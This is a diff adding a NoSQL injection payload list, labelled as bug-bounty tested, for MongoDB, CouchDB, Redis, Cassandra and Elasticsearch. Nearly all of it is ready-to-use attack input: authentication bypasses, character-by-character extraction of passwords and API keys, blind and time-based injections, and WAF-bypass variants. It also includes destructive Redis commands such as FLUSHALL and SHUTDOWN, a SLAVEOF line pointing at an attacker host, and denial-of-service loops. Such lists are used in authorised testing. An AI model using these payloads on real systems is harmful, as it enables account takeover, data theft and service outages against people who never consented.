@@ -1,0 +1,323 @@
+# NoSQL Injection Payloads (2020-2025 Bug Bounty Tested)
+
+# ============================
+# MongoDB Injection Payloads
+# ============================
+
+# Authentication Bypass - JSON Format
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
+
+# Authentication Bypass - URL Encoded
+username[$ne]=null&password[$ne]=null
+username[$ne]=&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$ne]=
+username=admin&password[$gt]=
+username[$nin][]=&password[$ne]=
+username[$exists]=true&password[$exists]=true
+
+# MongoDB Operators Injection
+{"$where": "sleep(5000)"}
+{"$where": "this.password == 'admin'"}
+{"username": {"$regex": "^admin"}}
+{"username": {"$regex": "admin.*"}}
+{"email": {"$regex": ".*@domain\\.com$"}}
+{"role": {"$in": ["admin", "superuser"]}}
+{"age": {"$gt": 0}}
+{"price": {"$lt": 9999}}
+{"status": {"$ne": "inactive"}}
+{"verified": {"$eq": true}}
+
+# Time-Based NoSQL Injection (MongoDB)
+{"$where": "sleep(5000) || true"}
+{"username": {"$regex": "^a"}, "$where": "sleep(5000)"}
+';sleep(5000);'
+';return true;var x='
+{"username": "admin", "$where": "sleep(5000)"}
+
+# Data Extraction - MongoDB
+{"username": {"$regex": "^a"}}
+{"username": {"$regex": "^ad"}}
+{"username": {"$regex": "^adm"}}
+{"username": {"$regex": "^admi"}}
+{"username": {"$regex": "^admin"}}
+{"password": {"$regex": "^[a-z]"}}
+{"apiKey": {"$regex": "^.*"}}
+
+# Boolean-Based MongoDB Injection
+{"username": "admin", "password": {"$ne": "wrong"}}
+{"$or": [{"username": "admin"}, {"email": "admin@test.com"}]}
+{"$and": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}
+{"$nor": [{"banned": true}, {"deleted": true}]}
+
+# MongoDB Command Injection
+{"username": "admin", "$comment": "test"}
+{"username": "admin", "$hint": "username_1"}
+{"$orderby": {"username": 1}}
+{"username": {"$type": 2}}
+{"username": {"$size": 5}}
+
+# MongoDB Operator Abuse
+{"username": {"$all": ["admin"]}}
+{"roles": {"$elemMatch": {"role": "admin"}}}
+{"metadata": {"$exists": false}}
+{"settings": {"$nin": ["disabled"]}}
+
+# Advanced MongoDB Injection (2023-2025)
+{"username": {"$expr": {"$eq": ["$username", "admin"]}}}
+{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
+{"username": {"$jsonSchema": {}}}
+{"username": "admin'; return true; var a='"}
+{"username": "admin\"; return true; var a=\""}
+
+# ============================
+# CouchDB Injection Payloads
+# ============================
+
+# CouchDB View Manipulation
+startkey="admin"&endkey="admin\ufff0"
+startkey=["admin"]&endkey=["admin", {}]
+key="admin"
+keys=["admin","root","administrator"]
+
+# CouchDB Query Injection
+{"selector": {"username": {"$eq": "admin"}}}
+{"selector": {"$or": [{"username": "admin"}, {"role": "admin"}]}}
+{"selector": {"password": {"$gt": null}}}
+{"selector": {"_id": {"$gte": null}}}
+
+# CouchDB Mango Query Injection
+{"selector": {"$and": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}}
+{"selector": {"username": {"$regex": "(?i)admin"}}}
+{"selector": {"email": {"$regex": ".*@.*"}}}
+
+# ============================
+# Redis Injection Payloads
+# ============================
+
+# Redis Command Injection
+\n\r\nSET key value\r\n
+\n\r\nFLUSHALL\r\n
+\n\r\nGET password\r\n
+\n\r\nKEYS *\r\n
+\n\r\nCONFIG GET *\r\n
+\n\r\nCONFIG SET dir /var/www/html\r\n
+\n\r\nSAVE\r\n
+\n\r\nSHUTDOWN\r\n
+\n\r\nSLAVEOF attacker.com 6379\r\n
+
+# Redis Protocol Injection
+*1\r\n$8\r\nFLUSHALL\r\n
+*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n
+*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n
+*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$5\r\nvalue\r\n
+
+# Redis Lua Injection
+EVAL "return redis.call('GET', 'password')" 0
+EVAL "return redis.call('KEYS', '*')" 0
+EVAL "redis.call('SET', 'hacked', 'true')" 0
+
+# ============================
+# Cassandra Injection Payloads
+# ============================
+
+# Cassandra CQL Injection
+' OR '1'='1
+admin' --
+admin' /*
+' ALLOW FILTERING --
+' AND token(id) > token(' union select * from users --')
+
+# ============================
+# Elasticsearch Injection
+# ============================
+
+# Elasticsearch Query Injection
+{"query": {"match_all": {}}}
+{"query": {"wildcard": {"username": "*"}}}
+{"query": {"regexp": {"password": ".*"}}}
+{"query": {"prefix": {"apikey": ""}}}
+{"query": {"bool": {"must_not": {"term": {"role": "guest"}}}}}
+
+# Elasticsearch Script Injection (Groovy/Painless)
+{"script": {"source": "doc['password'].value"}}
+{"query": {"script_score": {"query": {"match_all": {}}, "script": {"source": "Math.random()"}}}}
+
+# Elasticsearch Aggregation Injection
+{"aggs": {"passwords": {"terms": {"field": "password", "size": 1000}}}}
+{"aggs": {"users": {"terms": {"field": "username.keyword"}}}}
+
+# ============================
+# Generic NoSQL Injection
+# ============================
+
+# Array Injection
+username[]=admin&password[]=password
+username[$gt]=&password[$gt]=
+{"username": ["$ne", null], "password": ["$ne", null]}
+
+# Type Confusion
+username=admin&password=true
+username=admin&password=1
+{"username": "admin", "password": true}
+{"username": "admin", "password": 1}
+
+# Null Byte Injection
+admin%00
+admin\x00
+{"username": "admin\u0000"}
+
+# Comment Injection
+admin' // comment
+admin' /* comment */
+{"username": "admin' // ", "password": "pass"}
+
+# Encoding Bypasses
+{"username": {"$ne": "\u0000"}}
+{"username": {"$regex": "\x2e\x2a"}}
+
+# ============================
+# Authentication Bypass Combinations (High Success Rate 2020-2025)
+# ============================
+
+# JSON POST Body
+{"username": "admin", "password": {"$ne": null}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$exists": true}}
+{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$gt": ""}}
+{"username": "admin", "password": {"$regex": "^.*"}}
+
+# URL Parameters
+?username[$ne]=fake&password[$ne]=fake
+?username=admin&password[$gt]=
+?username[$regex]=admin&password[$ne]=fake
+?username[$in][]=admin&password[$exists]=true
+
+# Cookie Values
+username=admin; password[$ne]=fake
+session={"username":{"$ne":null},"password":{"$ne":null}}
+
+# HTTP Headers
+X-Username: admin
+X-Password: {"$ne": ""}
+Authorization: {"username": {"$ne": null}}
+
+# ============================
+# Advanced Data Extraction Techniques
+# ============================
+
+# Character-by-Character Extraction
+{"username": {"$regex": "^a.*"}}
+{"username": {"$regex": "^ad.*"}}
+{"username": {"$regex": "^adm.*"}}
+
+# Length-Based Extraction
+{"password": {"$regex": "^.{8}$"}}
+{"password": {"$regex": "^.{1,100}$"}}
+
+# Character Set Testing
+{"password": {"$regex": "^[a-z].*"}}
+{"password": {"$regex": "^[A-Z].*"}}
+{"password": {"$regex": "^[0-9].*"}}
+
+# ============================
+# Blind NoSQL Injection
+# ============================
+
+# Time-Based
+{"$where": "sleep(5000)"}
+{"$where": "this.username == 'admin' && sleep(5000)"}
+{"username": "admin", "$where": "sleep(5000) || true"}
+
+# Boolean-Based
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+
+# ============================
+# NoSQL Injection Payloads for APIs
+# ============================
+
+# GraphQL-style NoSQL Injection
+{"filter": {"username": {"$ne": null}}}
+{"where": {"password": {"$exists": true}}}
+{"match": {"role": "admin"}}
+
+# REST API Query Parameters
+?filter[username][$ne]=fake
+?where[password][$exists]=true
+?sort[role][$eq]=admin
+
+# ============================
+# Polyglot NoSQL Injection
+# ============================
+
+' || '1'=='1' || {"$ne":""}
+admin' || true || {"$ne": null}
+{"$ne": null} || '1'='1
+
+# ============================
+# Denial of Service (DoS) Payloads
+# ============================
+
+{"$where": "while(true){}"}
+{"$where": "for(var i=0;i<99999999;i++){}"}
+{"username": {"$regex": "^((((((((((a+)+)+)+)+)+)+)+)+)+)$"}}
+
+# ============================
+# Modern Framework-Specific Injections (2023-2025)
+# ============================
+
+# Express.js/Node.js
+req.body.username[$ne]=null
+req.query.password[$gt]=
+req.cookies.user[$exists]=true
+
+# Django MongoDB
+{"username__ne": null, "password__ne": null}
+{"username__regex": "admin"}
+{"password__exists": True}
+
+# PHP MongoDB
+array("username" => array('$ne' => null))
+array("password" => array('$gt' => ""))
+
+# Python (PyMongo)
+{"username": {"$ne": None}, "password": {"$ne": None}}
+{"username": {"$regex": ".*admin.*", "$options": "i"}}
+
+# ============================
+# WAF/Filter Bypass Techniques
+# ============================
+
+# Unicode Bypass
+{"username": {"$\u006Ee": null}}
+{"username": {"\u0024ne": null}}
+
+# Case Variation
+{"username": {"$Ne": null}}
+{"username": {"$NE": null}}
+
+# Spacing/Formatting
+{"username":{"$ne":null}}
+{ "username" : { "$ne" : null } }
+{"username"  :  {"$ne"  :  null}}
+
+# Property Pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+# ============================
+# Server-Side JavaScript Injection (SSJI)
+# ============================
+
+'; return true; var dummy='
+"; return true; var dummy="
+'; var ret = this; return ret; var dummy='
+{"$where": "function() { return true; }"}
+{"$where": "obj.credits - obj.price > 0"}
